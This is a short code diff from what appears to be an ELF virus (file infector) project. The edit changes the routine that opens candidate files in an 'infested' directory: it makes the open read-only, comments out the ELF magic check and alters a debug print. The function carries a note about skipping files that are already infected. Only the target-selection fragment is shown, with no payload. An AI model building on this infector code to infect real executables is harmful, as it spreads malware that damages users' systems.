@@ -14,17 +14,19 @@ int FORCE_INLINE is_good_format(char *filename)
 	ft_memcpy(buf, INFESTED_DIR, sizeof(INFESTED_DIR) - 1);
 	ft_memcpy(buf + sizeof(INFESTED_DIR) - 1, filename, name_size);
 	buf[name_size + sizeof(INFESTED_DIR) - 1] = 0;
-	fd = OPEN(buf, O_RDWR);
+	fd = OPEN(buf, 0);
 	if (fd < 0)
-		return (fd);
+		return (-1);
+	/*
 	READ(fd, buf, sizeof(ELFMAG) - 1);
 	if (ft_memcmp(buf, ELFMAG, sizeof(ELFMAG) - 1))
 	{
 		CLOSE(fd);
 		return (-1);
 	}
+	*/
 	// verify if not alread infected
-	WRITE(1, filename, name_size);
+	ft_putnbr(fd);
 	WRITE(1, "  OK\n", 5);
 	return (fd);
 }
